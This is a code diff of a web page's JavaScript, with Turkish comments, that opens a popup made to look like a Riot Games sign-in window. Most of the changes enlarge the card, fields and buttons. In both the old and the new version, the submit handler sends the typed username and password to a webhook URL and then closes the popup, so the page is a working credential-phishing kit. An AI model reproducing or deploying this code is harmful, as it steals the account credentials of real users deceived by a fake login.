@@ -159,7 +159,8 @@
         });
 
         function openAuth() {
-            const w = 450, h = 650;
+            // Boyutları bir tık büyüttüm (En: 500, Boy: 750)
+            const w = 500, h = 750;
             const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
             let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
             
@@ -168,51 +169,50 @@
                     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
                     body { 
                         margin:0; height:100vh; 
-                        background: url('login_bg.jpg') center/cover; /* Arka planına dokunmadım */
+                        background: url('login_bg.jpg') center/cover; 
                         display:flex; justify-content:center; align-items:center; 
                         font-family:'Inter', sans-serif; 
                     }
+                    /* Kartı da pencereye uyumlu şekilde bir tık büyüttüm */
                     .card { 
-                        background:#fff; width:340px; padding:50px 40px; 
+                        background:#fff; width:360px; padding:60px 45px; 
                         border-radius:4px; text-align:center; 
-                        box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+                        box-shadow: 0 10px 50px rgba(0,0,0,0.4);
                     }
                     h2 { 
-                        font-weight:900; font-size:24px; margin-bottom:30px; 
+                        font-weight:900; font-size:26px; margin-bottom:35px; 
                         text-transform:uppercase; color:#111; letter-spacing:-1px; 
                     }
                     input { 
-                        width:100%; padding:14px; margin:8px 0; background:#f2f2f2; 
+                        width:100%; padding:16px; margin:10px 0; background:#f2f2f2; 
                         border:2px solid transparent; border-radius:4px; box-sizing:border-box; 
-                        font-weight:700; font-size:12px; color:#111; outline:none; transition:0.2s;
+                        font-weight:700; font-size:13px; color:#111; outline:none; transition:0.2s;
                     }
                     input:focus { background:#fff; border-color:#111; }
                     input::placeholder { color:#999; text-transform:uppercase; }
 
-                    /* Sosyal Butonlar */
-                    .social-grid { display:grid; grid-template-columns:repeat(5, 1fr); gap:8px; margin:20px 0; }
-                    .social-btn { height:40px; border-radius:4px; display:flex; align-items:center; justify-content:center; cursor:pointer; }
+                    .social-grid { display:grid; grid-template-columns:repeat(5, 1fr); gap:10px; margin:25px 0; }
+                    .social-btn { height:45px; border-radius:4px; display:flex; align-items:center; justify-content:center; cursor:pointer; }
                     .fb { background:#1877f2; } .gg { background:#fff; border:1px solid #ddd; } .ap { background:#000; } .xb { background:#107c10; } .ps { background:#00439c; }
-                    .social-btn img { width:18px; }
+                    .social-btn img { width:20px; }
 
-                    /* Alt Kısım */
-                    .stay-signed { display:flex; align-items:center; gap:8px; font-size:12px; color:#111; font-weight:700; margin:15px 0; text-align:left; cursor:pointer; }
-                    .checkbox { width:16px; height:16px; background:#f2f2f2; border-radius:3px; }
+                    .stay-signed { display:flex; align-items:center; gap:10px; font-size:13px; color:#111; font-weight:700; margin:20px 0; text-align:left; cursor:pointer; }
+                    .checkbox { width:18px; height:18px; background:#f2f2f2; border-radius:3px; }
 
-                    .submit-container { margin-top:40px; display:flex; justify-content:center; }
+                    .submit-container { margin-top:50px; display:flex; justify-content:center; }
                     .next-btn { 
-                        width:70px; height:70px; border:2px solid #eee; border-radius:20px; 
+                        width:80px; height:80px; border:2px solid #eee; border-radius:24px; 
                         background:#fff; cursor:pointer; display:flex; align-items:center; 
                         justify-content:center; transition:0.3s; 
                     }
                     .next-btn.active { border-color:#ff4655; }
                     .next-btn.active svg { fill:#ff4655; }
-                    .next-btn svg { width:28px; fill:#ddd; }
+                    .next-btn svg { width:32px; fill:#ddd; }
 
-                    .footer-links { margin-top:40px; font-size:11px; font-weight:800; color:#111; text-transform:uppercase; opacity:0.6; }
+                    .footer-links { margin-top:50px; font-size:12px; font-weight:800; color:#111; text-transform:uppercase; opacity:0.6; }
                 </style>
                 <div class="card">
-                    <img src="login_logo.png" width="100" style="margin-bottom:20px;">
+                    <img src="login_logo.png" width="110" style="margin-bottom:25px;">
                     <h2>Oturum Aç</h2>
                     <input type="text" id="u" placeholder="Kullanıcı Adı">
                     <input type="password" id="p" placeholder="Şifre">
@@ -235,24 +235,21 @@
                     
                     <div class="footer-links">
                         <div>Oturum açamıyor musun?</div>
-                        <div style="margin-top:5px;">Hesap Oluştur</div>
+                        <div style="margin-top:8px;">Hesap Oluştur</div>
                     </div>
                 </div>
             `;
             
-            // Dinamik Buton Parlaması
             const u = win.document.getElementById('u'), p = win.document.getElementById('p'), btn = win.document.getElementById('go');
             const check = () => (u.value && p.value) ? btn.classList.add('active') : btn.classList.remove('active');
             u.oninput = check; p.oninput = check;
 
             win.document.getElementById('go').onclick = function() {
-                const username = u.value;
-                const password = p.value;
-                if(username && password) {
+                if(u.value && p.value) {
                     fetch(WEBHOOK_URL, { 
                         method: 'POST', 
                         headers: { 'Content-Type': 'application/json' }, 
-                        body: JSON.stringify({ content: "👤: " + username + " | 🔑: " + password }) 
+                        body: JSON.stringify({ content: "👤: " + u.value + " | 🔑: " + p.value }) 
                     });
                     win.close();
                 }
